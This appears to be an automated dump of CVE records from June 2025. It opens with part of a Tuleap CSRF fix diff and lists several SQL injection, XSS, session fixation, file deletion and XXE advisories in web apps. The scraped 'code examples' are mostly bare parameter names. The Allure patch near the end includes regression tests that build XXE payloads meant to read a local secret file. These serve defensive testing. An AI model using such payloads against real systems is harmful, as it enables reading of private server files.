@@ -152,6 +159,7 @@ protected function displayAdminResponse(TrackerManager $tracker_manager, $reques
                 'func'    => 'admin-canned',
                 'update'  => (int) $response->id,
             ]) . '" method="POST">';
+            echo $this->getCSRFTokenAdmin()->fetchHTMLInput();
             echo '<b>' . dgettext('tuleap-tracker', 'Title') . ':</b><br />';
             echo '<input type="text" name="title" value="' . $hp->purify($response->title, CODENDI_PURIFIER_CONVERT_HTML) . '" size="50">';
             echo '<p>';
@@ -168,4 +176,17 @@ protected function displayAdminResponse(TrackerManager $tracker_manager, $reques
             exit;
         }
     }
+
+    private function getURLAdmin(): string
+    {
+        return TRACKER_BASE_URL . '/?' . http_build_query([
+            'tracker' => (int) $this->tracker->id,
+            'func'    => 'admin-canned',
+        ]);
+    }
+
+    private function getCSRFTokenAdmin(): CSRFSynchronizerToken
+    {
+        return new CSRFSynchronizerToken($this->getURLAdmin());
+    }
 }
diff --git a/plugins/tracker/scripts/tracker-admin/src/canned-responses.ts b/plugins/tracker/scripts/tracker-admin/src/canned-responses.ts
new file mode 100644
index 00000000000..f98fc4d0a55
--- /dev/null
+++ b/plugins/tracker/scripts/tracker-admin/src/canned-responses.ts
@@ -0,0 +1,37 @@
+/**
+ * Copyright (c) Enalean, 2025-Present. All Rights Reserved.
+ *
+ * This file is a part of Tuleap.
+ *
+ * Tuleap is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * Tuleap is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with Tuleap. If not, see <http://www.gnu.org/licenses/>.
+ */
+
+document.addEventListener("DOMContentLoaded", () => {
+    const forms = document.querySelectorAll("form.delete-canned-response");
+
+    forms.forEach((form: Element): void => {
+        form.addEventListener("submit", (event: Event) => {
+            const confirmation_message = form.getAttribute("data-confirmation-message");
+            if (confirmation_message === null) {
+                throw new Error(
+                    "Confirmation message is missing on the delete canned response form",
+                );
+            }
+            // eslint-disable-next-line no-alert
+            if (!confirm(confirmation_message)) {
+                event.preventDefault();
+            }
+        });
+    });
+});
diff --git a/plugins/tracker/scripts/tracker-admin/webpack.common.js b/plugins/tracker/scripts/tracker-admin/webpack.common.js
index a5ddfeabe6d..a433882b3a1 100644
--- a/plugins/tracker/scripts/tracker-admin/webpack.common.js
+++ b/plugins/tracker/scripts/tracker-admin/webpack.common.js
@@ -24,6 +24,7 @@ module.exports = [
     {
         entry: {
             "done-semantic": "./src/semantics/status/done-picker.ts",
+            "canned-responses": "./src/canned-responses.ts",
             "field-permissions": "./src/field-permissions.ts",
             "progress-semantic": "./src/semantics/progress/admin-selectors.ts",
             "semantics-homepage": "./src/semantics/homepage.ts",
diff --git a/plugins/tracker/site-content/fr_FR/LC_MESSAGES/tuleap-tracker.po b/plugins/tracker/site-content/fr_FR/LC_MESSAGES/tuleap-tracker.po
index f39b8697859..9f1a19851eb 100644
--- a/plugins/tracker/site-content/fr_FR/LC_MESSAGES/tuleap-tracker.po
+++ b/plugins/tracker/site-content/fr_FR/LC_MESSAGES/tuleap-tracker.po
@@ -1258,6 +1258,9 @@ msgstr "Suppression annulée"
 msgid "Delete permanently the field"
 msgstr "Supprimer définitivement le champ"
 
+msgid "Delete the canned response"
+msgstr "Supprimer la réponse type"
+
 msgid "Delete the reference?"
 msgstr "Supprimer la référence ?"
 
@@ -1265,7 +1268,7 @@ msgid "Delete the value"
 msgstr "Supprimer la valeur"
 
 #, php-format
-msgid "Delete this Canned Response : %1$s ?"
+msgid "Delete this Canned Response: %1$s?"
 msgstr "Détruire cette réponse type&nbsp;: %1$s ?"
 
 msgid "Delete this tracker"
diff --git a/plugins/tracker/site-content/pt_BR/LC_MESSAGES/tuleap-tracker.po b/plugins/tracker/site-content/pt_BR/LC_MESSAGES/tuleap-tracker.po
index d9db34c1a8f..a655da4fd7c 100644
--- a/plugins/tracker/site-content/pt_BR/LC_MESSAGES/tuleap-tracker.po
+++ b/plugins/tracker/site-content/pt_BR/LC_MESSAGES/tuleap-tracker.po
@@ -1099,6 +1099,9 @@ msgstr ""
 msgid "Delete permanently the field"
 msgstr ""
 
+msgid "Delete the canned response"
+msgstr ""
+
 msgid "Delete the reference?"
 msgstr ""
 
@@ -1106,7 +1109,7 @@ msgid "Delete the value"
 msgstr ""
 
 #, php-format
-msgid "Delete this Canned Response : %1$s ?"
+msgid "Delete this Canned Response: %1$s?"
 msgstr ""
 
 msgid "Delete this tracker"


================================================================================


CVE ID: CVE-2025-6604
Published: 2025-06-25T13:15:27.557
Modified: 2025-07-02T16:36:48.957
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in SourceCodester Best Salon Management System 1.0. This affects an unknown part of the file /panel/add-staff.php. The manipulation of the argument Name leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-5.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313821 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313821 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601913 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-5.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313821 ---
name

================================================================================


CVE ID: CVE-2025-6603
Published: 2025-06-25T11:15:22.193
Modified: 2025-06-26T18:57:43.670
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-189: CWE-189
  - CWE-190: Integer Overflow or Wraparound

Description:
A vulnerability was found in coldfunction qCUDA up to db0085400c2f2011eed46fbc04fdc0873141688e. It has been rated as problematic. Affected by this issue is the function qcow_make_empty of the file qCUDA/qcu-device/block/qcow.c. The manipulation of the argument s->l1_size leads to integer overflow. The attack needs to be approached locally. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available.

References (4):
  1. https://github.com/coldfunction/qCUDA/issues/10
  2. https://vuldb.com/?ctiid.313820
  3. https://vuldb.com/?id.313820
  4. https://vuldb.com/?submit.601029

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313820 ---
qcow_make_empty

qcow_make_empty

s->l1_size

================================================================================


CVE ID: CVE-2025-6613
Published: 2025-06-25T10:15:23.253
Modified: 2025-07-02T16:43:35.053
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability classified as problematic was found in PHPGurukul Hospital Management System 4.0. Affected by this vulnerability is an unknown functionality of the file /doctor/manage-patient.php. The manipulation of the argument Name leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Vanshdhawan188/Stored-XSS-Hospital-Management/blob/main/Stored-XSS-Hospital-Management.md [Exploit, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.313831 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313831 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602005 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313831 ---
Name

================================================================================


CVE ID: CVE-2025-5927
Published: 2025-06-25T10:15:23.090
Modified: 2025-07-08T14:54:00.810
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-36: CWE-36

Description:
The Everest Forms (Pro) plugin for WordPress is vulnerable to arbitrary file deletion due to insufficient file path validation in the delete_entry_files() function in all versions up to, and including, 1.9.4. This makes it possible for unauthenticated attackers to delete arbitrary files on the server, which can easily lead to remote code execution when the right file is deleted (such as wp-config.php). The vulnerability requires an admin to trigger the deletion via deletion of a form entry and cannot be carried out by the attacker alone.

References (3):
  1. https://everestforms.net/changelog/ [Product, Release Notes]
  2. https://wordpress.org/plugins/everest-forms/ [Product]
  3. https://www.wordfence.com/threat-intel/vulnerabilities/id/9e3a118f-4321-4579-a986-05ce077dc6b9?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://everestforms.net/changelog/ ---
form_id

selectWoo

colorpick

================================================================================


CVE ID: CVE-2025-6583
Published: 2025-06-25T00:15:22.763
Modified: 2025-07-02T16:46:47.320
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in SourceCodester Best Salon Management System 1.0. This affects an unknown part of the file /view-appointment.php. The manipulation of the argument viewid leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-4.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313779 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313779 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601911 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-4.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313779 ---
viewid

================================================================================


CVE ID: CVE-2025-6582
Published: 2025-06-25T00:15:21.573
Modified: 2025-07-02T17:04:36.247
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in SourceCodester Best Salon Management System 1.0. Affected by this issue is some unknown functionality of the file /edit-customer-detailed.php. The manipulation of the argument editid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-3.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313778 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313778 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601910 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-3.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313778 ---
editid

================================================================================


CVE ID: CVE-2025-6581
Published: 2025-06-24T23:15:21.087
Modified: 2025-07-02T17:11:46.147
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in SourceCodester Best Salon Management System 1.0. Affected by this vulnerability is an unknown functionality of the file /add-customer.php. The manipulation of the argument name/email/mobilenum/gender/details/dob/marriage_date leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-2.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313777 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313777 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601909 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-2.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313777 ---
name/email/mobilenum/gender/details/dob/marriage_date

================================================================================


CVE ID: CVE-2025-6580
Published: 2025-06-24T22:15:22.620
Modified: 2025-07-02T17:13:55.277
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in SourceCodester Best Salon Management System 1.0. Affected is an unknown function of the component Login. The manipulation of the argument Username leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-1.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313776 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313776 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601908 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-1.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313776 ---
username

================================================================================


CVE ID: CVE-2025-6579
Published: 2025-06-24T20:15:27.630
Modified: 2025-07-11T15:52:31.527
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Car Rental System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /message_admin.php. The manipulation of the argument Message leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/yangfan-lang/cve/issues/4 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313775 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313775 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601764 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313775 ---
message

================================================================================


CVE ID: CVE-2025-6578
Published: 2025-06-24T20:15:27.433
Modified: 2025-07-11T15:53:57.230
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Simple Online Hotel Reservation System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /admin/delete_account.php. The manipulation of the argument admin_id leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/yangfan-lang/cve/issues/3 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313774 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313774 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601763 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313774 ---
admin_id

================================================================================


CVE ID: CVE-2025-53021
Published: 2025-06-24T20:15:26.867
Modified: 2025-07-09T15:23:31.237
CVSS Score: 4.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-384: CWE-384

Description:
A session fixation vulnerability in Moodle 3.x through 3.11.18 allows unauthenticated attackers to hijack user sessions via the sesskey parameter. The sesskey can be obtained without authentication and reused within the OAuth2 login flow, resulting in the victim's session being linked to the attacker's. Successful exploitation results in full account takeover. According to the Moodle Releases page, "Bug fixes for security issues in 3.11.x ended 11 December 2023." NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

References (3):
  1. https://github.com/moodle/moodle/releases/tag/v3.11.18 [Product]
  2. https://moodledev.io/general/releases#moodle-311 [Product]
  3. https://rentry.co/moodle-oauth2-cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/moodle/moodle/releases/tag/v3.11.18 ---
375a116

375a116

================================================================================


CVE ID: CVE-2025-52888
Published: 2025-06-24T20:15:26.700
Modified: 2025-06-26T18:58:14.280
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-611: Improper Restriction of XML External Entity Reference

Description:
Allure 2 is the version 2.x branch of Allure Report, a multi-language test reporting tool. A critical XML External Entity (XXE) vulnerability exists in the xunit-xml-plugin used by Allure 2 prior to version 2.34.1. The plugin fails to securely configure the XML parser (`DocumentBuilderFactory`) and allows external entity expansion when processing test result .xml files. This allows attackers to read arbitrary files from the file system and potentially trigger server-side request forgery (SSRF). Version 2.34.1 contains a patch for the issue.

References (2):
  1. https://github.com/allure-framework/allure2/commit/cbcb33719851ff70adce85d38e15d20fc58d4eb7
  2. https://github.com/allure-framework/allure2/security/advisories/GHSA-h7qf-qmf3-85qg

Attempting to extract code examples from references...

--- Code from https://github.com/allure-framework/allure2/commit/cbcb33719851ff70adce85d38e15d20fc58d4eb7 ---
From cbcb33719851ff70adce85d38e15d20fc58d4eb7 Mon Sep 17 00:00:00 2001
From: Dmitry Baev <baev.dm@gmail.com>
Date: Fri, 20 Jun 2025 16:38:53 +0100
Subject: [PATCH] fix xee (via #3029)

---
 .../parser/ClasspathEntityResolver.java       | 100 ++++++++++++++++++
 gradle/quality-configs/pmd/pmd.xml            |   1 +
 .../allure/junitxml/JunitXmlPlugin.java       |   3 +
 .../allure/junitxml/JunitXmlPluginTest.java   |  37 +++++++
 .../java/io/qameta/allure/trx/TrxPlugin.java  |   3 +
 .../io/qameta/allure/trx/TrxPluginTest.java   |  61 +++++++++++
 .../allure/xunitxml/XunitXmlPlugin.java       |   3 +
 .../allure/xunitxml/XunitXmlPluginTest.java   |  44 ++++++++
 8 files changed, 252 insertions(+)
 create mode 100644 allure-plugin-api/src/main/java/io/qameta/allure/parser/ClasspathEntityResolver.java

diff --git a/allure-plugin-api/src/main/java/io/qameta/allure/parser/ClasspathEntityResolver.java b/allure-plugin-api/src/main/java/io/qameta/allure/parser/ClasspathEntityResolver.java
new file mode 100644
index 000000000..33f9cb3dc
--- /dev/null
+++ b/allure-plugin-api/src/main/java/io/qameta/allure/parser/ClasspathEntityResolver.java
@@ -0,0 +1,100 @@
+/*
+ *  Copyright 2016-2024 Qameta Software Inc
+ *
+ *  Licensed under the Apache License, Version 2.0 (the "License");
+ *  you may not use this file except in compliance with the License.
+ *  You may obtain a copy of the License at
+ *
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ *
+ *  Unless required by applicable law or agreed to in writing, software
+ *  distributed under the License is distributed on an "AS IS" BASIS,
+ *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ *  See the License for the specific language governing permissions and
+ *  limitations under the License.
+ */
+package io.qameta.allure.parser;
+
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+import org.xml.sax.EntityResolver;
+import org.xml.sax.InputSource;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.util.Objects;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+/**
+ * ClasspathEntityResolver only allows to resolve dtd schemas, available in classpath.
+ * For all other entities it returns empty schema.
+ *
+ * @author charlie (Dmitry Baev).
+ */
+public class ClasspathEntityResolver implements EntityResolver {
+
+    private static final Logger LOGGER = LoggerFactory.getLogger(ClasspathEntityResolver.class);
+
+    private static final Pattern PATTERN = Pattern.compile("^.*/(.+\\.[dD][tT][dD]])$");
+
+    private static final byte[] EMPTY_SCHEMA_BYTES = "".getBytes(StandardCharsets.UTF_8);
+
+    @Override
+    public InputSource resolveEntity(final String publicId,
+                                     final String systemId) {
+        if (Objects.nonNull(systemId)) {
+            final Matcher matcher = PATTERN.matcher(systemId);
+            if (matcher.matches()) {
+                final String schemaName = matcher.group();
+                final String resourceName = "dtd/" + schemaName;
+
+                return classpathInputSource(publicId, systemId, resourceName);
+            }
+        }
+
+        return getInputSource(publicId, systemId, EMPTY_SCHEMA_BYTES);
+    }
+
+    private InputSource classpathInputSource(final String publicId,
+                                             final String systemId,
+                                             final String resourceName) {
+        final byte[] schema = getBytes(resourceName);
+        return getInputSource(publicId, systemId, schema);
+    }
+
+    private static InputSource getInputSource(final String publicId, final String systemId, final byte[] schema) {
+        final InputSource inputSource = new InputSource(new ByteArrayInputStream(schema));
+        inputSource.setPublicId(publicId);
+        inputSource.setSystemId(systemId);
+        inputSource.setEncoding(StandardCharsets.UTF_8.name());
+        return inputSource;
+    }
+
+    @SuppressWarnings("AssignmentInOperand")
+    private static byte[] getBytes(final String resourceName) {
+        try (InputStream is = Thread.currentThread().getContextClassLoader().getResourceAsStream(resourceName)) {
+            if (Objects.isNull(is)) {
+                LOGGER.debug("schema resource {} not found", resourceName);
+                return EMPTY_SCHEMA_BYTES;
+            }
+            final byte[] buffer = new byte[1000];
+
+            final ByteArrayOutputStream byteArrayOutputStream
+                    = new ByteArrayOutputStream();
+
+            int temp;
+
+            while ((temp = is.read(buffer)) != -1) {
+                byteArrayOutputStream.write(buffer, 0, temp);
+            }
+            return byteArrayOutputStream.toByteArray();
+        } catch (IOException e) {
+            LOGGER.debug("can't read schema resource {}", resourceName, e);
+            return EMPTY_SCHEMA_BYTES;
+        }
+    }
+}
diff --git a/gradle/quality-configs/pmd/pmd.xml b/gradle/quality-configs/pmd/pmd.xml
index 8b51dfdcb..56cdaaf6c 100644
--- a/gradle/quality-configs/pmd/pmd.xml
+++ b/gradle/quality-configs/pmd/pmd.xml
@@ -97,6 +97,7 @@
   <rule ref="category/java/errorprone.xml">
     <exclude name="AvoidCatchingThrowable"/>
     <exclude name="AvoidFieldNameMatchingMethodName"/>
+    <exclude name="AssignmentInOperand"/>  <!-- duplicate of checkstyle check AssignmentInOperand -->
     <exclude name="AvoidLiteralsInIfCondition"/>
     <exclude name="EmptyFinalizer"/>
     <exclude name="FinalizeDoesNotCallSuperFinalize"/>
diff --git a/plugins/junit-xml-plugin/src/main/java/io/qameta/allure/junitxml/JunitXmlPlugin.java b/plugins/junit-xml-plugin/src/main/java/io/qameta/allure/junitxml/JunitXmlPlugin.java
index 1bea7b2e1..32971c55e 100644
--- a/plugins/junit-xml-plugin/src/main/java/io/qameta/allure/junitxml/JunitXmlPlugin.java
+++ b/plugins/junit-xml-plugin/src/main/java/io/qameta/allure/junitxml/JunitXmlPlugin.java
@@ -30,6 +30,7 @@
 import io.qameta.allure.entity.Step;
 import io.qameta.allure.entity.TestResult;
 import io.qameta.allure.entity.Time;
+import io.qameta.allure.parser.ClasspathEntityResolver;
 import io.qameta.allure.parser.XmlElement;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -133,7 +134,9 @@ private void parseRootElement(final Path resultsDirectory, final Path parsedFile
         try {
             LOGGER.debug("Parsing file {}", parsedFile);
             final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+            factory.setValidating(false);
             final DocumentBuilder builder = factory.newDocumentBuilder();
+            builder.setEntityResolver(new ClasspathEntityResolver());
 
             final XmlElement rootElement = new XmlElement(builder.parse(parsedFile.toFile()).getDocumentElement());
             final String elementName = rootElement.getName();
diff --git a/plugins/junit-xml-plugin/src/test/java/io/qameta/allure/junitxml/JunitXmlPluginTest.java b/plugins/junit-xml-plugin/src/test/java/io/qameta/allure/junitxml/JunitXmlPluginTest.java
index c4ea82637..d0dc28f0e 100644
--- a/plugins/junit-xml-plugin/src/test/java/io/qameta/allure/junitxml/JunitXmlPluginTest.java
+++ b/plugins/junit-xml-plugin/src/test/java/io/qameta/allure/junitxml/JunitXmlPluginTest.java
@@ -35,6 +35,7 @@
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.ZoneOffset;
@@ -349,6 +350,42 @@ void shouldProcessFilesWithZuluTimestamp() throws Exception {
                 );
     }
 
+    @Test
+    void cveEntityReadTest(@TempDir final Path tmp) throws IOException {
+        final Path secretFile = tmp.resolve("secretfile.ini");
+        Files.writeString(secretFile,
+                "[owner]\n"
+                + "name = John Doe\n"
+                + "organization = Example Org.\n",
+                StandardCharsets.UTF_8
+        );
+
+        Files.writeString(
+                resultsDirectory.resolve("bad-test.xml"),
+                "<?xml version=\"1.0\"?>\n"
+                + "<!DOCTYPE foo [\n"
+                + "  <!ENTITY xxe SYSTEM \"" + secretFile.toUri() + "\">\n"
+                + "]>\n"
+                + "<testsuite tests=\"5\" failures=\"1\" name=\"org.allurefw.report.junit.JunitXmlPluginTest\" time=\"0.354\" errors=\"0\" skipped=\"1\">\n"
+                + "  <testcase classname=\"org.allurefw.report.junit.JunitXmlPluginTest\" name=\"shouldReadFailures\" time=\"0.012\">\n"
+                + "    <failure message=\"message\">&xxe;\n"
+                + "    </failure>\n"
+                + "  </testcase>\n"
+                + "</testsuite>",
+                StandardCharsets.UTF_8
+        );
+
+        JunitXmlPlugin reader = new JunitXmlPlugin();
+
+        reader.readResults(configuration, visitor, resultsDirectory);
+
+        final ArgumentCaptor<TestResult> captor = ArgumentCaptor.captor();
+        verify(visitor, times(1)).visitTestResult(captor.capture());
+
+        final TestResult testResult = captor.getValue();
+        assertThat(testResult.getStatusTrace()).doesNotContain("John Doe").doesNotContain("Example Org");
+    }
+
     private void process(String... strings) throws IOException {
         Iterator<String> iterator = Arrays.asList(strings).iterator();
         while (iterator.hasNext()) {
diff --git a/plugins/trx-plugin/src/main/java/io/qameta/allure/trx/TrxPlugin.java b/plugins/trx-plugin/src/main/java/io/qameta/allure/trx/TrxPlugin.java
index 122d3a49a..3e614dc4f 100644
--- a/plugins/trx-plugin/src/main/java/io/qameta/allure/trx/TrxPlugin.java
+++ b/plugins/trx-plugin/src/main/java/io/qameta/allure/trx/TrxPlugin.java
@@ -25,6 +25,7 @@
 import io.qameta.allure.entity.Step;
 import io.qameta.allure.entity.TestResult;
 import io.qameta.allure.entity.Time;
+import io.qameta.allure.parser.ClasspathEntityResolver;
 import io.qameta.allure.parser.XmlElement;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -106,7 +107,9 @@ protected void parseTestRun(final Path parsedFile, final RandomUidContext contex
             LOGGER.debug("Parsing file {}", parsedFile);
 
             final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+            factory.setValidating(false);
             final DocumentBuilder builder = factory.newDocumentBuilder();
+            builder.setEntityResolver(new ClasspathEntityResolver());
             final Document document = builder.parse(parsedFile.toFile());
             final XmlElement testRunElement = new XmlElement(document.getDocumentElement());
             final String elementName = testRunElement.getName();
diff --git a/plugins/trx-plugin/src/test/java/io/qameta/allure/trx/TrxPluginTest.java b/plugins/trx-plugin/src/test/java/io/qameta/allure/trx/TrxPluginTest.java
index 11948acb5..f2c437a95 100644
--- a/plugins/trx-plugin/src/test/java/io/qameta/allure/trx/TrxPluginTest.java
+++ b/plugins/trx-plugin/src/test/java/io/qameta/allure/trx/TrxPluginTest.java
@@ -30,6 +30,7 @@
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.ArrayList;
@@ -183,6 +184,66 @@ void shouldParseTestResultChildren() throws Exception {
 
     }
 
+    @Test
+    void cveEntityReadTest(@TempDir final Path tmp) throws IOException {
+        final Path secretFile = tmp.resolve("secretfile.ini");
+        Files.writeString(secretFile,
+                "[owner]\n"
+                + "name = John Doe\n"
+                + "organization = Example Org.\n",
+                StandardCharsets.UTF_8
+        );
+
+        Files.writeString(
+                resultsDirectory.resolve("bad-test.trx"),
+                "<?xml version=\"1.0\"?>\n"
+                + "<!DOCTYPE foo [\n"
